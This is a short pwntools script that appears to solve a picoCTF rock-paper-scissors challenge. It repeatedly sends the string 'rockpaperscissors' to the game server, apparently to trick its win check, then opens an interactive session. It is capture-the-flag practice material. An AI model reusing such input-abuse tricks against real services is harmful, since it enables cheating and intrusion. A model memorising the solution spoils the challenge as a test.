#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 59970
HOST = "saturn.picoctf.net"
exe = context.binary = ELF('./game', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

for i in range(5):
	p.sendline(b'1')
	p.sendline(b"rockpaperscissors")

p.sendline(b'2')
p.interactive()
